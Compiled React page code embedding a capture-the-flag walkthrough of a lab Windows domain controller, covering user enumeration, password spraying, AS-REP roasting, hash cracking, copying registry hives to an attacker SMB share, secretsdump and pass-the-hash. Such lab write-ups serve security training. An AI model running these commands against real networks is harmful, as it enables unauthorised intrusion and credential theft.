{"ast":null,"code":"var _jsxFileName = \"/home/v01/Myrepos/Port2/src/pages/writeups/dc02/DC02Walkthrough.js\";\nimport React from 'react';\nimport { Link } from 'react-router-dom';\nimport { motion } from 'framer-motion';\nimport { FaArrowLeft, FaCalendar, FaTag, FaServer, FaStar, FaDesktop, FaNetworkWired } from 'react-icons/fa';\nimport TableOfContents from '../../../components/TableOfContents';\nimport './DC02Walkthrough.css';\nimport { jsxDEV as _jsxDEV } from \"react/jsx-dev-runtime\";\nconst DC02Walkthrough = () => {\n  // DC02 Writeup data\n  const writeup = {\n    id: 'dc02-walkthrough',\n    title: 'DC02 Walkthrough',\n    date: 'Aug 12, 2025',\n    tags: ['hmv', 'windows', 'ad', 'asreproast', 'dcsync', 'backup-operators', 'password-cracking', 'smb', 'ldap'],\n    difficulty: 'Medium',\n    os: 'Windows',\n    ip: '192.168.0.18',\n    content: `\n# Overview\n\nThis Windows Domain Controller (DC01) in the SOUPEDECODE.LOCAL domain was discovered via internal network scanning. Enumeration revealed multiple Active Directory services and valid SMB credentials (charlie:charlie). AS-REP roasting against zximena448 yielded the password internet, granting Backup Operators group privileges. Registry hives (SAM, SYSTEM, SECURITY) were extracted remotely and cracked to obtain administrator-level hashes. Pass-the-Hash via WinRM provided full domain compromise and access to the root flag.\n\n# Enumeration\n\nWe can run the \\`fping\\` command to find the exact IP address of the machine.\n\\`\\`\\`bash\nfping -g 192.168.0.0/24 | grep \"is alive\"\n192.168.0.1 is alive\n192.168.0.8 is alive\n192.168.0.18 is alive\n192.168.0.7 is alive\n192.168.0.11 is alive\n\\`\\`\\`\n\nRunning \\`Nmap\\` port scanner to enumerate the services running on the target machine. From the nmap scan we have an indication that the target is running a Windows Server with \\`Active Directory\\` services.\n\\`\\`\\`bash\nsudo nmap -vv -sS -Pn -n -p- -sV -sC --min-rate=10000 192.168.0.18 -oN nmap/log.nmap\n\nPORT      STATE SERVICE       REASON          VERSION\n53/tcp    open  domain        syn-ack ttl 128 Simple DNS Plus\n88/tcp    open  kerberos-sec  syn-ack ttl 128 Microsoft Windows Kerberos (server time: 2025-03-07 22:09:06Z)\n135/tcp   open  msrpc         syn-ack ttl 128 Microsoft Windows RPC\n139/tcp   open  netbios-ssn   syn-ack ttl 128 Microsoft Windows netbios-ssn\n389/tcp   open  ldap          syn-ack ttl 128 Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL0., Site: Default-First-Site-Name)\n445/tcp   open  microsoft-ds? syn-ack ttl 128\n464/tcp   open  kpasswd5?     syn-ack ttl 128\n593/tcp   open  ncacn_http    syn-ack ttl 128 Microsoft Windows RPC over HTTP 1.0\n636/tcp   open  tcpwrapped    syn-ack ttl 128\n3268/tcp  open  ldap          syn-ack ttl 128 Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL0., Site: Default-First-Site-Name)\n3269/tcp  open  tcpwrapped    syn-ack ttl 128\n5985/tcp  open  http          syn-ack ttl 128 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-server-header: Microsoft-HTTPAPI/2.0\n|_http-title: Not Found\n9389/tcp  open  mc-nmf        syn-ack ttl 128 .NET Message Framing\n49664/tcp open  msrpc         syn-ack ttl 128 Microsoft Windows RPC\n49667/tcp open  msrpc         syn-ack ttl 128 Microsoft Windows RPC\n49682/tcp open  ncacn_http    syn-ack ttl 128 Microsoft Windows RPC over HTTP 1.0\n49713/tcp open  msrpc         syn-ack ttl 128 Microsoft Windows RPC\nMAC Address: 08:00:27:81:BE:9A (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nService Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| nbstat: NetBIOS name: DC01, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:81:be:9a (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n| Names:\n|   DC01<00>             Flags: <unique><active>\n|   SOUPEDECODE<00>      Flags: <group><active>\n|   SOUPEDECODE<1c>      Flags: <group><active>\n|   DC01<20>             Flags: <unique><active>\n|   SOUPEDECODE<1b>      Flags: <unique><active>\n| Statistics:\n|   08:00:27:81:be:9a:00:00:00:00:00:00:00:00:00:00:00\n|   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00\n|_  00:00:00:00:00:00:00:00:00:00:00:00:00:00\n| p2p-conficker: \n|   Checking for Conficker.C or higher...\n|   Check 1 (port 48259/tcp): CLEAN (Timeout)\n|   Check 2 (port 7597/tcp): CLEAN (Timeout)\n|   Check 3 (port 45162/udp): CLEAN (Timeout)\n|   Check 4 (port 59782/udp): CLEAN (Timeout)\n|_  0/4 checks are positive: Host is CLEAN or ports are blocked\n| smb2-time: \n|   date: 2025-03-07T22:09:54\n|_  start_date: N/A\n| smb2-security-mode: \n|   3:1:1: \n|_    Message signing enabled and required\n|_clock-skew: 3h59m56s\n\\`\\`\\`\n\nAdding the domains into \\`hosts\\` file.\n\\`\\`\\`bash\necho \"192.168.0.18 DC01.SOUPEDECODE.LOCAL SOUPEDECODE.LOCAL\" | sudo tee -a /etc/hosts\n\\`\\`\\`\n\nRunning kerbrute to enumerate users.\n\\`\\`\\`bash\n./kerbrute_linux_amd64 userenum --dc 192.168.0.18 -d SOUPEDECODE.LOCAL /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt\n\\`\\`\\`\n\n![Kerbrute User Enumeration](/writeup-images/DC02_images/1.png)\n\n# Exploitation\n\nWe can try an usernameâ€“password pairs line by line using nxc. We will see that \\`charlie:charlie\\` is a valid pair.\n\\`\\`\\`bash\nnxc smb 192.168.0.18 -u charlie -p charlie\n\\`\\`\\`\n\n![SMB Authentication](/writeup-images/DC02_images/2.png)\n\nWith \\`charlie\\` credentials, we can access and enumerate the SMB shares.\n\\`\\`\\`bash\nnxc smb 192.168.0.18 -u charlie -p charlie --shares\n\\`\\`\\`\n\n![SMB Shares Enumeration](/writeup-images/DC02_images/3.png)\n\nEnumerating users from LDAP with nxc.\n\\`\\`\\`bash\nnxc ldap SOUPEDECODE.LOCAL -u charlie -p charlie --users\n\\`\\`\\`\n\n![IPC Share Listing](/writeup-images/DC02_images/4.png)\n\nSaved the users result on a file. Now we can try to make an AS-REP roast attack using the impacket tool, that will allow us to extract the asrep hash of \\`zximena448\\`.\n\\`\\`\\`bash\nimpacket-GetNPUsers -dc-ip 192.168.0.18 -request -usersfile users.txt SOUPEDECODE.LOCAL/\n\\`\\`\\`\n\n![NETLOGON Share Listing](/writeup-images/DC02_images/5.png)\n\nCracking the \\`zximena448\\` hash with hashcat.\n\\`\\`\\`bash\nhashcat -m 18200 -a 0 hash /usr/share/wordlists/rockyou.txt\n\\`\\`\\`\n\n![SYSVOL Share Listing](/writeup-images/DC02_images/6.png)\n\nThe \\`zximena448\\` user have READ and WRITE permissions on C$ share folder:\n\\`\\`\\`bash\nnxc smb SOUPEDECODE.LOCAL -u zximena448 -p i... --shares\n\\`\\`\\`\n\n![SYSVOL Domain Listing](/writeup-images/DC02_images/7.png)\n\nAuthenticating as \\`zximena448\\` user and retrieving the user flag.\n\\`\\`\\`bash\nsmbclient //192.168.0.18/C$ -U 'zximena448'\n\\`\\`\\`\n\n![SYSVOL Policies Listing](/writeup-images/DC02_images/8.png)\n\n# Post-Exploitation\n\n## Privilege Escalation\n\nDumping domain informations with ldapdomaindump.\n\\`\\`\\`bash\nsudo ldapdomaindump -u 'SOUPDECODE.LOCAL\\zximena448' -p 'i...' 192.168.0.18\n\\`\\`\\`\n\n![SYSVOL Policy Listing](/writeup-images/DC02_images/9.png)\n\nThe \\`zximena448\\` user it's a member from Backup Operator group.\n![SYSVOL Machine Listing](/writeup-images/DC02_images/10.png)\n\nWith that information, we can make a copy from SAM, SYSTEM and SECURITY files. In that case, we can use the \\`impacket-reg\\` tool.\n\n* Creating a share folder to receive the files:\n\\`\\`\\`bash\nmkdir -p /tmp/share\nchmod 777 /tmp/share\nimpacket-smbserver share /tmp/share -smb2support\n\\`\\`\\`\n\n* Running the \\`impacket-reg\\` command to copy the files:\n\\`\\`\\`bash\nimpacket-reg SOUPDECODE.LOCAL/zximena448:i...@192.168.0.18 backup -o '\\\\192.168.0.8\\share'\n\\`\\`\\`\n![SYSVOL Scripts Listing](/writeup-images/DC02_images/11.png)\n\nWith those files, we can use \\`impacket-secretsdump\\` to extract the hashes.\n\\`\\`\\`bash\nimpacket-secretsdump -sam SAM.save -system SYSTEM.save -security SECURITY.save LOCAL\n\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:209c...:::\nGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nDefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\n\\`\\`\\`\n![SYSVOL Startup Listing](/writeup-images/DC02_images/12.png)\n\nWe also can use the dc01 user account and make a pass the hash attack to dump all hashes from domain controler.\n\\`\\`\\`bash\nimpacket-secretsdump SOUPEDECODE.LOCAL/'dc01$'@192.168.0.18 -hashes :84204...\n\\`\\`\\`\n![Backup Script Content](/writeup-images/DC02_images/13.png)\n\nWe can see that the backup script contains credentials for the \\`dc01$\\` machine account. Let's use these credentials to dump the hashes.\n\n\\`\\`\\`bash\nimpacket-secretsdump SOUPEDECODE.LOCAL/'dc01$'@192.168.0.18 -hashes :84204...\n\\`\\`\\`\n\n![Domain Controller Hash Dump](/writeup-images/DC02_images/13.png)\n\nWe can authenticate as the Administrator making a pass the hash attack:\n\\`\\`\\`bash\nnxc winrm 192.168.0.18 -u Administrator -H 8982...\n\\`\\`\\`\n\n![Administrator Authentication](/writeup-images/DC02_images/14.png)\n\nAuthenticating as Administrator and retrieving the root flag.\n\\`\\`\\`bash\nevil-winrm -i 192.168.0.18 -u Administrator -H 8982...\n\\`\\`\\`\n\n![Root Flag Retrieval](/writeup-images/DC02_images/17.png)\n    `\n  };\n  return /*#__PURE__*/_jsxDEV(motion.div, {\n    className: \"writeup-detail-page\",\n    initial: {\n      opacity: 0,\n      y: 20\n    },\n    animate: {\n      opacity: 1,\n      y: 0\n    },\n    transition: {\n      duration: 0.6\n    },\n    children: [/*#__PURE__*/_jsxDEV(\"div\", {\n      className: \"writeup-header\",\n      children: [/*#__PURE__*/_jsxDEV(Link, {\n        to: \"/writeups\",\n        className: \"back-button\",\n        children: [/*#__PURE__*/_jsxDEV(FaArrowLeft, {}, void 0, false, {\n          fileName: _jsxFileName,\n          lineNumber: 231,\n          columnNumber: 11\n        }, this), /*#__PURE__*/_jsxDEV(\"span\", {\n          children: \"Back to Writeups\"\n        }, void 0, false, {\n          fileName: _jsxFileName,\n          lineNumber: 232,\n          columnNumber: 11\n        }, this)]\n      }, void 0, true, {\n        fileName: _jsxFileName,\n        lineNumber: 230,\n        columnNumber: 9\n      }, this), /*#__PURE__*/_jsxDEV(motion.div, {\n        className: \"writeup-title-section\",\n        initial: {\n          opacity: 0,\n          y: 20\n        },\n        animate: {\n          opacity: 1,\n          y: 0\n        },\n        transition: {\n          delay: 0.2,\n          duration: 0.6\n        },\n        children: [/*#__PURE__*/_jsxDEV(\"h1\", {\n          children: writeup.title\n        }, void 0, false, {\n          fileName: _jsxFileName,\n          lineNumber: 241,\n          columnNumber: 11\n        }, this), /*#__PURE__*/_jsxDEV(\"div\", {\n          className: \"writeup-meta\",\n          children: [/*#__PURE__*/_jsxDEV(\"div\", {\n            className: \"meta-item\",\n            children: [/*#__PURE__*/_jsxDEV(FaCalendar, {}, void 0, false, {\n              fileName: _jsxFileName,\n              lineNumber: 245,\n              columnNumber: 15\n            }, this), /*#__PURE__*/_jsxDEV(\"span\", {\n              children: writeup.date\n            }, void 0, false, {\n              fileName: _jsxFileName,\n              lineNumber: 246,\n              columnNumber: 15\n            }, this)]\n          }, void 0, true, {\n            fileName: _jsxFileName,\n            lineNumber: 244,\n            columnNumber: 13\n          }, this), /*#__PURE__*/_jsxDEV(\"div\", {\n            className: \"meta-item\",\n            children: [/*#__PURE__*/_jsxDEV(FaTag, {}, void 0, false, {\n              fileName: _jsxFileName,\n              lineNumber: 249,\n              columnNumber: 15\n            }, this), /*#__PURE__*/_jsxDEV(\"span\", {\n              children: [\"Difficulty: \", writeup.difficulty]\n            }, void 0, true, {\n              fileName: _jsxFileName,\n              lineNumber: 250,\n              columnNumber: 15\n            }, this)]\n          }, void 0, true, {\n            fileName: _jsxFileName,\n            lineNumber: 248,\n            columnNumber: 13\n          }, this)]\n        }, void 0, true, {\n          fileName: _jsxFileName,\n          lineNumber: 243,\n          columnNumber: 11\n        }, this), /*#__PURE__*/_jsxDEV(\"div\", {\n          className: \"writeup-tags\",\n          children: writeup.tags.map((tag, index) => /*#__PURE__*/_jsxDEV(motion.span, {\n            className: \"tag-badge\",\n            initial: {\n              scale: 0,\n              opacity: 0\n            },\n            animate: {\n              scale: 1,\n              opacity: 1\n            },\n            transition: {\n              delay: 0.3 + index * 0.1,\n              duration: 0.3\n            },\n            whileHover: {\n              scale: 1.1\n            },\n            children: tag\n          }, tag, false, {\n            fileName: _jsxFileName,\n            lineNumber: 256,\n            columnNumber: 15\n          }, this))\n        }, void 0, false, {\n          fileName: _jsxFileName,\n          lineNumber: 254,\n          columnNumber: 11\n        }, this), /*#__PURE__*/_jsxDEV(\"div\", {\n          className: \"machine-info\",\n          children: /*#__PURE__*/_jsxDEV(\"div\", {\n            className: \"machine-info-content\",\n            children: [/*#__PURE__*/_jsxDEV(\"div\", {\n              className: \"machine-info-left\",\n              children: [/*#__PURE__*/_jsxDEV(\"h6\", {\n                children: [/*#__PURE__*/_jsxDEV(FaServer, {}, void 0, false, {\n                  fileName: _jsxFileName,\n                  lineNumber: 272,\n                  columnNumber: 21\n                }, this), \" Machine Information:\"]\n              }, void 0, true, {\n                fileName: _jsxFileName,\n                lineNumber: 272,\n                columnNumber: 17\n              }, this), /*#__PURE__*/_jsxDEV(\"div\", {\n                className: \"machine-badges\",\n                children: [/*#__PURE__*/_jsxDEV(\"span\", {\n                  className: \"badge bg-primary\",\n                  children: [/*#__PURE__*/_jsxDEV(FaStar, {}, void 0, false, {\n                    fileName: _jsxFileName,\n                    lineNumber: 275,\n                    columnNumber: 21\n                  }, this), \" Difficulty: \", writeup.difficulty]\n                }, void 0, true, {\n                  fileName: _jsxFileName,\n                  lineNumber: 274,\n                  columnNumber: 19\n                }, this), /*#__PURE__*/_jsxDEV(\"span\", {\n                  className: \"badge bg-info\",\n                  children: [/*#__PURE__*/_jsxDEV(FaDesktop, {}, void 0, false, {\n                    fileName: _jsxFileName,\n                    lineNumber: 278,\n                    columnNumber: 21\n                  }, this), \" OS: \", writeup.os]\n                }, void 0, true, {\n                  fileName: _jsxFileName,\n                  lineNumber: 277,\n                  columnNumber: 19\n                }, this), /*#__PURE__*/_jsxDEV(\"span\", {\n                  className: \"badge bg-secondary\",\n                  children: [/*#__PURE__*/_jsxDEV(FaNetworkWired, {}, void 0, false, {\n                    fileName: _jsxFileName,\n                    lineNumber: 281,\n                    columnNumber: 21\n                  }, this), \" IP: \", writeup.ip]\n                }, void 0, true, {\n                  fileName: _jsxFileName,\n                  lineNumber: 280,\n                  columnNumber: 19\n                }, this)]\n              }, void 0, true, {\n                fileName: _jsxFileName,\n                lineNumber: 273,\n                columnNumber: 17\n              }, this)]\n            }, void 0, true, {\n              fileName: _jsxFileName,\n              lineNumber: 271,\n              columnNumber: 15\n            }, this), /*#__PURE__*/_jsxDEV(\"div\", {\n              className: \"machine-info-right\",\n              children: /*#__PURE__*/_jsxDEV(\"img\", {\n                src: \"/writeup-images/dc02-machine.png\",\n                alt: \"DC02 Machine\",\n                className: \"machine-image\"\n              }, void 0, false, {\n                fileName: _jsxFileName,\n                lineNumber: 286,\n                columnNumber: 17\n              }, this)\n            }, void 0, false, {\n              fileName: _jsxFileName,\n              lineNumber: 285,\n              columnNumber: 15\n            }, this)]\n          }, void 0, true, {\n            fileName: _jsxFileName,\n            lineNumber: 270,\n            columnNumber: 13\n          }, this)\n        }, void 0, false, {\n          fileName: _jsxFileName,\n          lineNumber: 269,\n          columnNumber: 11\n        }, this)]\n      }, void 0, true, {\n        fileName: _jsxFileName,\n        lineNumber: 235,\n        columnNumber: 9\n      }, this)]\n    }, void 0, true, {\n      fileName: _jsxFileName,\n      lineNumber: 229,\n      columnNumber: 7\n    }, this), /*#__PURE__*/_jsxDEV(\"div\", {\n      className: \"writeup-layout\",\n      children: [/*#__PURE__*/_jsxDEV(motion.div, {\n        className: \"writeup-content\",\n        initial: {\n          opacity: 0,\n          y: 20\n        },\n        animate: {\n          opacity: 1,\n          y: 0\n        },\n        transition: {\n          delay: 0.4,\n          duration: 0.6\n        },\n        children: /*#__PURE__*/_jsxDEV(\"div\", {\n          className: \"markdown-content\",\n          children: (() => {\n            const lines = writeup.content.split('\\n');\n            const elements = [];\n            let i = 0;\n            while (i < lines.length) {\n              const line = lines[i];\n              if (line.startsWith('# ')) {\n                elements.push(/*#__PURE__*/_jsxDEV(\"h1\", {\n                  children: line.substring(2)\n                }, i, false, {\n                  fileName: _jsxFileName,\n                  lineNumber: 310,\n                  columnNumber: 33\n                }, this));\n              } else if (line.startsWith('## ')) {\n                elements.push(/*#__PURE__*/_jsxDEV(\"h2\", {\n                  children: line.substring(3)\n                }, i, false, {\n                  fileName: _jsxFileName,\n                  lineNumber: 312,\n                  columnNumber: 33\n                }, this));\n              } else if (line.startsWith('### ')) {\n                elements.push(/*#__PURE__*/_jsxDEV(\"h3\", {\n                  children: line.substring(4)\n                }, i, false, {\n                  fileName: _jsxFileName,\n                  lineNumber: 314,\n                  columnNumber: 33\n                }, this));\n              } else if (line.startsWith('```')) {\n                // Handle code blocks\n                const language = line.substring(3).trim();\n                const codeLines = [];\n                i++;\n                while (i < lines.length && !lines[i].startsWith('```')) {\n                  codeLines.push(lines[i]);\n                  i++;\n                }\n                elements.push(/*#__PURE__*/_jsxDEV(\"pre\", {\n                  className: \"code-block\",\n                  children: /*#__PURE__*/_jsxDEV(\"code\", {\n                    className: `language-${language}`,\n                    children: codeLines.join('\\n')\n                  }, void 0, false, {\n                    fileName: _jsxFileName,\n                    lineNumber: 328,\n                    columnNumber: 23\n                  }, this)\n                }, i, false, {\n                  fileName: _jsxFileName,\n                  lineNumber: 327,\n                  columnNumber: 21\n                }, this));\n              } else if (line.startsWith('![') && line.includes('](') && line.endsWith(')')) {\n                const altText = line.match(/\\[(.*?)\\]/)[1];\n                const imageSrc = line.match(/\\((.*?)\\)/)[1];\n                elements.push(/*#__PURE__*/_jsxDEV(\"div\", {\n                  className: \"image-container\",\n                  children: /*#__PURE__*/_jsxDEV(\"img\", {\n                    src: imageSrc,\n                    alt: altText,\n                    className: \"content-image\"\n                  }, void 0, false, {\n                    fileName: _jsxFileName,\n                    lineNumber: 338,\n                    columnNumber: 23\n                  }, this)\n                }, i, false, {\n                  fileName: _jsxFileName,\n                  lineNumber: 337,\n                  columnNumber: 21\n                }, this));\n              } else if (line.trim() === '') {\n                elements.push(/*#__PURE__*/_jsxDEV(\"br\", {}, i, false, {\n                  fileName: _jsxFileName,\n                  lineNumber: 342,\n                  columnNumber: 33\n                }, this));\n              } else {\n                // Process inline markdown\n                const processedLine = line.replace(/\\*\\*(.*?)\\*\\*/g, '<strong>$1</strong>') // Bold\n                .replace(/\\*(.*?)\\*/g, '<em>$1</em>') // Italic\n                .replace(/`(.*?)`/g, '<code class=\"inline-code\">$1</code>'); // Inline code\n\n                elements.push(/*#__PURE__*/_jsxDEV(\"p\", {\n                  dangerouslySetInnerHTML: {\n                    __html: processedLine\n                  }\n                }, i, false, {\n                  fileName: _jsxFileName,\n                  lineNumber: 351,\n                  columnNumber: 21\n                }, this));\n              }\n              i++;\n            }\n            return elements;\n          })()\n        }, void 0, false, {\n          fileName: _jsxFileName,\n          lineNumber: 300,\n          columnNumber: 11\n        }, this)\n      }, void 0, false, {\n        fileName: _jsxFileName,\n        lineNumber: 294,\n        columnNumber: 9\n      }, this), /*#__PURE__*/_jsxDEV(TableOfContents, {\n        content: writeup.content\n      }, void 0, false, {\n        fileName: _jsxFileName,\n        lineNumber: 362,\n        columnNumber: 9\n      }, this)]\n    }, void 0, true, {\n      fileName: _jsxFileName,\n      lineNumber: 293,\n      columnNumber: 7\n    }, this)]\n  }, void 0, true, {\n    fileName: _jsxFileName,\n    lineNumber: 223,\n    columnNumber: 5\n  }, this);\n};\n_c = DC02Walkthrough;\nexport default DC02Walkthrough;\nvar _c;\n$RefreshReg$(_c, \"DC02Walkthrough\");","map":{"version":3,"names":["React","Link","motion","FaArrowLeft","FaCalendar","FaTag","FaServer","FaStar","FaDesktop","FaNetworkWired","TableOfContents","jsxDEV","_jsxDEV","DC02Walkthrough","writeup","id","title","date","tags","difficulty","os","ip","content","div","className","initial","opacity","y","animate","transition","duration","children","to","fileName","_jsxFileName","lineNumber","columnNumber","delay","map","tag","index","span","scale","whileHover","src","alt","lines","split","elements","i","length","line","startsWith","push","substring","language","trim","codeLines","join","includes","endsWith","altText","match","imageSrc","processedLine","replace","dangerouslySetInnerHTML","__html","_c","$RefreshReg$"],"sources":["/home/v01/Myrepos/Port2/src/pages/writeups/dc02/DC02Walkthrough.js"],"sourcesContent":["import React from 'react';\nimport { Link } from 'react-router-dom';\nimport { motion } from 'framer-motion';\nimport { FaArrowLeft, FaCalendar, FaTag, FaServer, FaStar, FaDesktop, FaNetworkWired } from 'react-icons/fa';\nimport TableOfContents from '../../../components/TableOfContents';\nimport './DC02Walkthrough.css';\n\nconst DC02Walkthrough = () => {\n  // DC02 Writeup data\n  const writeup = {\n    id: 'dc02-walkthrough',\n    title: 'DC02 Walkthrough',\n    date: 'Aug 12, 2025',\n    tags: ['hmv', 'windows', 'ad', 'asreproast', 'dcsync', 'backup-operators', 'password-cracking', 'smb', 'ldap'],\n    difficulty: 'Medium',\n    os: 'Windows',\n    ip: '192.168.0.18',\n    content: `\n# Overview\n\nThis Windows Domain Controller (DC01) in the SOUPEDECODE.LOCAL domain was discovered via internal network scanning. Enumeration revealed multiple Active Directory services and valid SMB credentials (charlie:charlie). AS-REP roasting against zximena448 yielded the password internet, granting Backup Operators group privileges. Registry hives (SAM, SYSTEM, SECURITY) were extracted remotely and cracked to obtain administrator-level hashes. Pass-the-Hash via WinRM provided full domain compromise and access to the root flag.\n\n# Enumeration\n\nWe can run the \\`fping\\` command to find the exact IP address of the machine.\n\\`\\`\\`bash\nfping -g 192.168.0.0/24 | grep \"is alive\"\n192.168.0.1 is alive\n192.168.0.8 is alive\n192.168.0.18 is alive\n192.168.0.7 is alive\n192.168.0.11 is alive\n\\`\\`\\`\n\nRunning \\`Nmap\\` port scanner to enumerate the services running on the target machine. From the nmap scan we have an indication that the target is running a Windows Server with \\`Active Directory\\` services.\n\\`\\`\\`bash\nsudo nmap -vv -sS -Pn -n -p- -sV -sC --min-rate=10000 192.168.0.18 -oN nmap/log.nmap\n\nPORT      STATE SERVICE       REASON          VERSION\n53/tcp    open  domain        syn-ack ttl 128 Simple DNS Plus\n88/tcp    open  kerberos-sec  syn-ack ttl 128 Microsoft Windows Kerberos (server time: 2025-03-07 22:09:06Z)\n135/tcp   open  msrpc         syn-ack ttl 128 Microsoft Windows RPC\n139/tcp   open  netbios-ssn   syn-ack ttl 128 Microsoft Windows netbios-ssn\n389/tcp   open  ldap          syn-ack ttl 128 Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL0., Site: Default-First-Site-Name)\n445/tcp   open  microsoft-ds? syn-ack ttl 128\n464/tcp   open  kpasswd5?     syn-ack ttl 128\n593/tcp   open  ncacn_http    syn-ack ttl 128 Microsoft Windows RPC over HTTP 1.0\n636/tcp   open  tcpwrapped    syn-ack ttl 128\n3268/tcp  open  ldap          syn-ack ttl 128 Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL0., Site: Default-First-Site-Name)\n3269/tcp  open  tcpwrapped    syn-ack ttl 128\n5985/tcp  open  http          syn-ack ttl 128 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-server-header: Microsoft-HTTPAPI/2.0\n|_http-title: Not Found\n9389/tcp  open  mc-nmf        syn-ack ttl 128 .NET Message Framing\n49664/tcp open  msrpc         syn-ack ttl 128 Microsoft Windows RPC\n49667/tcp open  msrpc         syn-ack ttl 128 Microsoft Windows RPC\n49682/tcp open  ncacn_http    syn-ack ttl 128 Microsoft Windows RPC over HTTP 1.0\n49713/tcp open  msrpc         syn-ack ttl 128 Microsoft Windows RPC\nMAC Address: 08:00:27:81:BE:9A (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nService Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| nbstat: NetBIOS name: DC01, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:81:be:9a (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n| Names:\n|   DC01<00>             Flags: <unique><active>\n|   SOUPEDECODE<00>      Flags: <group><active>\n|   SOUPEDECODE<1c>      Flags: <group><active>\n|   DC01<20>             Flags: <unique><active>\n|   SOUPEDECODE<1b>      Flags: <unique><active>\n| Statistics:\n|   08:00:27:81:be:9a:00:00:00:00:00:00:00:00:00:00:00\n|   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00\n|_  00:00:00:00:00:00:00:00:00:00:00:00:00:00\n| p2p-conficker: \n|   Checking for Conficker.C or higher...\n|   Check 1 (port 48259/tcp): CLEAN (Timeout)\n|   Check 2 (port 7597/tcp): CLEAN (Timeout)\n|   Check 3 (port 45162/udp): CLEAN (Timeout)\n|   Check 4 (port 59782/udp): CLEAN (Timeout)\n|_  0/4 checks are positive: Host is CLEAN or ports are blocked\n| smb2-time: \n|   date: 2025-03-07T22:09:54\n|_  start_date: N/A\n| smb2-security-mode: \n|   3:1:1: \n|_    Message signing enabled and required\n|_clock-skew: 3h59m56s\n\\`\\`\\`\n\nAdding the domains into \\`hosts\\` file.\n\\`\\`\\`bash\necho \"192.168.0.18 DC01.SOUPEDECODE.LOCAL SOUPEDECODE.LOCAL\" | sudo tee -a /etc/hosts\n\\`\\`\\`\n\nRunning kerbrute to enumerate users.\n\\`\\`\\`bash\n./kerbrute_linux_amd64 userenum --dc 192.168.0.18 -d SOUPEDECODE.LOCAL /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt\n\\`\\`\\`\n\n![Kerbrute User Enumeration](/writeup-images/DC02_images/1.png)\n\n# Exploitation\n\nWe can try an usernameâ€“password pairs line by line using nxc. We will see that \\`charlie:charlie\\` is a valid pair.\n\\`\\`\\`bash\nnxc smb 192.168.0.18 -u charlie -p charlie\n\\`\\`\\`\n\n![SMB Authentication](/writeup-images/DC02_images/2.png)\n\nWith \\`charlie\\` credentials, we can access and enumerate the SMB shares.\n\\`\\`\\`bash\nnxc smb 192.168.0.18 -u charlie -p charlie --shares\n\\`\\`\\`\n\n![SMB Shares Enumeration](/writeup-images/DC02_images/3.png)\n\nEnumerating users from LDAP with nxc.\n\\`\\`\\`bash\nnxc ldap SOUPEDECODE.LOCAL -u charlie -p charlie --users\n\\`\\`\\`\n\n![IPC Share Listing](/writeup-images/DC02_images/4.png)\n\nSaved the users result on a file. Now we can try to make an AS-REP roast attack using the impacket tool, that will allow us to extract the asrep hash of \\`zximena448\\`.\n\\`\\`\\`bash\nimpacket-GetNPUsers -dc-ip 192.168.0.18 -request -usersfile users.txt SOUPEDECODE.LOCAL/\n\\`\\`\\`\n\n![NETLOGON Share Listing](/writeup-images/DC02_images/5.png)\n\nCracking the \\`zximena448\\` hash with hashcat.\n\\`\\`\\`bash\nhashcat -m 18200 -a 0 hash /usr/share/wordlists/rockyou.txt\n\\`\\`\\`\n\n![SYSVOL Share Listing](/writeup-images/DC02_images/6.png)\n\nThe \\`zximena448\\` user have READ and WRITE permissions on C$ share folder:\n\\`\\`\\`bash\nnxc smb SOUPEDECODE.LOCAL -u zximena448 -p i... --shares\n\\`\\`\\`\n\n![SYSVOL Domain Listing](/writeup-images/DC02_images/7.png)\n\nAuthenticating as \\`zximena448\\` user and retrieving the user flag.\n\\`\\`\\`bash\nsmbclient //192.168.0.18/C$ -U 'zximena448'\n\\`\\`\\`\n\n![SYSVOL Policies Listing](/writeup-images/DC02_images/8.png)\n\n# Post-Exploitation\n\n## Privilege Escalation\n\nDumping domain informations with ldapdomaindump.\n\\`\\`\\`bash\nsudo ldapdomaindump -u 'SOUPDECODE.LOCAL\\zximena448' -p 'i...' 192.168.0.18\n\\`\\`\\`\n\n![SYSVOL Policy Listing](/writeup-images/DC02_images/9.png)\n\nThe \\`zximena448\\` user it's a member from Backup Operator group.\n![SYSVOL Machine Listing](/writeup-images/DC02_images/10.png)\n\nWith that information, we can make a copy from SAM, SYSTEM and SECURITY files. In that case, we can use the \\`impacket-reg\\` tool.\n\n* Creating a share folder to receive the files:\n\\`\\`\\`bash\nmkdir -p /tmp/share\nchmod 777 /tmp/share\nimpacket-smbserver share /tmp/share -smb2support\n\\`\\`\\`\n\n* Running the \\`impacket-reg\\` command to copy the files:\n\\`\\`\\`bash\nimpacket-reg SOUPDECODE.LOCAL/zximena448:i...@192.168.0.18 backup -o '\\\\192.168.0.8\\share'\n\\`\\`\\`\n![SYSVOL Scripts Listing](/writeup-images/DC02_images/11.png)\n\nWith those files, we can use \\`impacket-secretsdump\\` to extract the hashes.\n\\`\\`\\`bash\nimpacket-secretsdump -sam SAM.save -system SYSTEM.save -security SECURITY.save 